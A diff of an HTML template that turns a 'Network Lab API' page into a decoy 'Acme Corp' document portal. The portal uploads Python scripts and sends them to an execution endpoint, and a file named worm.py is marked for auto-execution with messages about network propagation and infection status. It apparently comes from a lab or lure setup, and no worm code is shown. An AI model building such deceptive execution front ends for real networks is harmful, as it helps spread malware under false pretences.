@@ -1,51 +1,357 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Lab Control Center</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internal Document Portal - Acme Corp</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+        .header {
+            background: rgba(0,0,0,0.3);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        .container {
+            max-width: 1000px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: 40px;
+        }
+        .upload-section {
+            border: 3px dashed #667eea;
+            border-radius: 12px;
+            padding: 50px;
+            text-align: center;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8ec 100%);
+            margin-bottom: 30px;
+            transition: all 0.3s ease;
+        }
+        .upload-section:hover {
+            background: linear-gradient(135deg, #e4e8ec 0%, #d1d8e0 100%);
+            transform: translateY(-2px);
+            cursor: pointer;
+        }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 14px 28px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        .btn-danger {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a5a 100%);
+        }
+        .btn-danger:hover {
+            box-shadow: 0 5px 20px rgba(255, 107, 107, 0.4);
+        }
+        .btn-success {
+            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+        }
+        .file-list {
+            margin-top: 30px;
+        }
+        .file-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px;
+            border: 1px solid #e0e0e0;
+            background: #fafbfc;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            transition: all 0.2s ease;
+        }
+        .file-item:hover {
+            background: #f0f4f8;
+            transform: translateX(5px);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .status {
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: none;
+            font-weight: 500;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+            display: block;
+        }
+        .info-box {
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+            border-left: 5px solid #2196f3;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+        }
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        .badge-ready { background: #4caf50; color: white; }
+        .badge-running { background: #ff9800; color: white; animation: pulse 2s infinite; }
+        .badge-auto { background: #9c27b0; color: white; }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        .network-status {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        .status-item {
+            text-align: center;
+            padding: 15px;
+        }
+        .status-number {
+            font-size: 32px;
+            font-weight: bold;
+            color: #667eea;
+        }
+        .status-label {
+            font-size: 12px;
+            color: #666;
+            text-transform: uppercase;
+        }
+    </style>
 </head>
 <body>
+    <div class="header">
+        <h1>📁 Internal Document Management System</h1>
+        <p>Enterprise Network Automation Platform • Acme Corporation</p>
+    </div>
+
     <div class="container">
-        <h1>🚀 Network Lab API</h1>
-        
-        <div class="section">
-            <h3>Upload Payload</h3>
-            <input type="file" id="fileInput">
-            <button onclick="uploadFile()">Upload .py script</button>
+        <div class="info-box">
+            <strong>ℹ️ Network Automation:</strong> Upload Python scripts to automate tasks across the network infrastructure. 
+            Scripts are distributed to all connected nodes for execution. <strong>worm.py</strong> files are auto-executed for network maintenance.
         </div>
 
-        <div class="section">
-            <h3>Uploaded Files (Click to Execute)</h3>
-            <ul id="fileList">
-                {% for file in files %}
-                <li>
-                    <span>{{ file }}</span>
-                    <button class="run-btn" onclick="executeFile('{{ file }}')">Run Exploit</button>
-                </li>
-                {% endfor %}
-            </ul>
+        <div id="statusMsg" class="status"></div>
+
+        <div class="network-status">
+            <div class="status-item">
+                <div class="status-number" id="nodeCount">4</div>
+                <div class="status-label">Active Nodes</div>
+            </div>
+            <div class="status-item">
+                <div class="status-number" style="color: #4caf50;">●</div>
+                <div class="status-label">Network Status</div>
+            </div>
+            <div class="status-item">
+                <div class="status-number" id="scriptCount">0</div>
+                <div class="status-label">Scripts Ready</div>
+            </div>
+            <div class="status-item">
+                <div class="status-number">v2.4</div>
+                <div class="status-label">System Version</div>
+            </div>
+        </div>
+
+        <div class="upload-section" onclick="document.getElementById('fileInput').click()">
+            <h2>📤 Upload Automation Script</h2>
+            <p style="color: #666; margin: 15px 0;">Drag & drop or click to browse</p>
+            <p style="color: #999; font-size: 14px;">Supported: .py files for network automation</p>
+            <input type="file" id="fileInput" accept=".py" style="display:none;" onchange="handleFileSelect()">
+            <p id="selectedFile" style="color: #667eea; margin-top: 15px; font-weight: 600;"></p>
+            <button class="btn" onclick="event.stopPropagation(); uploadFile()">📤 Upload to Network</button>
+        </div>
+
+        <div class="file-list">
+            <h3>📋 Network Shared Scripts</h3>
+            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">
+                Scripts available for execution across all infrastructure nodes:
+            </p>
+            
+            <div id="fileListContainer">
+                {% if files %}
+                    {% for file in files %}
+                    <div class="file-item">
+                        <div style="display: flex; align-items: center; gap: 15px;">
+                            <span style="font-size: 24px;">🐍</span>
+                            <div>
+                                <strong>{{ file }}</strong>
+                                {% if file == "worm.py" %}
+                                    <span class="badge badge-auto">Auto-Execute</span>
+                                {% else %}
+                                    <span class="badge badge-ready">Ready</span>
+                                {% endif %}
+                            </div>
+                        </div>
+                        <div>
+                            {% if file == "worm.py" %}
+                                <span style="color: #9c27b0; font-size: 12px; margin-right: 10px;">Auto-deployed on upload</span>
+                            {% endif %}
+                            <button class="btn btn-success" onclick="executeFile('{{ file }}')">▶ Execute</button>
+                            <button class="btn btn-danger" onclick="deleteFile('{{ file }}')">🗑</button>
+                        </div>
+                    </div>
+                    {% endfor %}
+                {% else %}
+                    <div style="text-align: center; padding: 40px; color: #999;">
+                        <p style="font-size: 48px; margin-bottom: 10px;">📭</p>
+                        <p>No automation scripts uploaded yet.</p>
+                        <p style="font-size: 14px;">Upload a Python script to begin network automation.</p>
+                    </div>
+                {% endif %}
+            </div>
+        </div>
+
+        <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #e0e0e0; text-align: center; color: #999; font-size: 12px;">
+            <p>🔒 Secure Connection • SSL Encrypted • Internal Network Only</p>
+            <p>© 2025 Acme Corporation • Authorized Personnel Only</p>
         </div>
     </div>
 
     <script>
-        async function uploadFile() {
-            const fileInput = document.getElementById('fileInput');
-            const formData = new FormData();
-            formData.append('file', fileInput.files[0]);
+        let selectedFile = null;
+        
+        // Update script count on load
+        document.addEventListener('DOMContentLoaded', function() {
+            const files = document.querySelectorAll('.file-item');
+            document.getElementById('scriptCount').textContent = files.length;
+        });
 
-            await fetch('/upload', {method: 'POST', body: formData});
-            location.reload();
+        function handleFileSelect() {
+            const input = document.getElementById('fileInput');
+            const display = document.getElementById('selectedFile');
+            if (input.files && input.files[0]) {
+                selectedFile = input.files[0];
+                const isWorm = selectedFile.name === 'worm.py';
+                display.innerHTML = `Selected: ${selectedFile.name} (${(selectedFile.size/1024).toFixed(2)} KB) ${isWorm ? '<span class="badge badge-auto">Will Auto-Execute</span>' : ''}`;
+            }
+        }
+
+        async function uploadFile() {
+            const input = document.getElementById('fileInput');
+            if (!input.files || !input.files[0]) {
+                showStatus('⚠️ Please select a Python script to upload', 'error');
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append('file', input.files[0]);
+            
+            const isWorm = input.files[0].name === 'worm.py';
+            showStatus(isWorm ? '🚀 Uploading worm.py... Auto-deployment initiating!' : '📤 Uploading script to network...', 'info');
+            
+            try {
+                const response = await fetch('/upload', {method: 'POST', body: formData});
+                const data = await response.json();
+                
+                if (data.status === 'saved') {
+                    if (isWorm) {
+                        showStatus('✅ worm.py uploaded! Network propagation started automatically. Check dashboard for status.', 'success');
+                    } else {
+                        showStatus(`✅ ${data.filename} uploaded successfully! Click "Execute" to run on network.`, 'success');
+                    }
+                    setTimeout(() => location.reload(), 2500);
+                } else {
+                    showStatus('❌ Upload failed: ' + (data.error || 'Unknown error'), 'error');
+                }
+            } catch (err) {
+                showStatus('❌ Network error during upload. Check connection.', 'error');
+            }
         }
 
         async function executeFile(filename) {
-            const res = await fetch('/exec', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({file: filename})
-            });
-            const data = await res.json();
-            alert(data.status === 'executing' ? "Worm Started!" : "Error: " + data.error);
+            const isWorm = filename === 'worm.py';
+            const msg = isWorm 
+                ? `Deploy "${filename}" across all network nodes?\n\nThis will initiate network-wide automation.` 
+                : `Execute "${filename}" on the network?`;
+                
+            if (!confirm(msg)) return;
+            
+            showStatus(`🚀 Executing ${filename} across network nodes...`, 'info');
+            
+            try {
+                const response = await fetch('/exec', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({file: filename})
+                });
+                const data = await response.json();
+                
+                if (data.status === 'executing') {
+                    showStatus(isWorm 
+                        ? '✅ Network worm deployed! Propagation in progress. Monitor dashboard for infection status.' 
+                        : `✅ ${filename} executed successfully!`, 'success');
+                } else {
+                    showStatus('❌ Execution failed: ' + (data.error || 'Unknown error'), 'error');
+                }
+            } catch (err) {
+                showStatus('❌ Network error. Check if nodes are responsive.', 'error');
+            }
         }
+
+        async function deleteFile(filename) {
+            if (!confirm(`Remove "${filename}" from network shared storage?`)) return;
+            showStatus('ℹ️ Delete functionality requires admin privileges', 'error');
+        }
+
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('statusMsg');
+            statusDiv.innerHTML = message;
+            statusDiv.className = 'status ' + type;
+        }
+
+        // Drag and drop support
+        document.addEventListener('dragover', (e) => { e.preventDefault(); document.body.style.opacity = '0.9'; });
+        document.addEventListener('dragleave', () => { document.body.style.opacity = '1'; });
+        document.addEventListener('drop', (e) => {
+            e.preventDefault();
+            document.body.style.opacity = '1';
+            const files = e.dataTransfer.files;
+            if (files.length > 0 && files[0].name.endsWith('.py')) {
+                document.getElementById('fileInput').files = files;
+                handleFileSelect();
+            } else {
+                showStatus('⚠️ Please upload Python (.py) files only', 'error');
+            }
+        });
     </script>
 </body>
 </html>
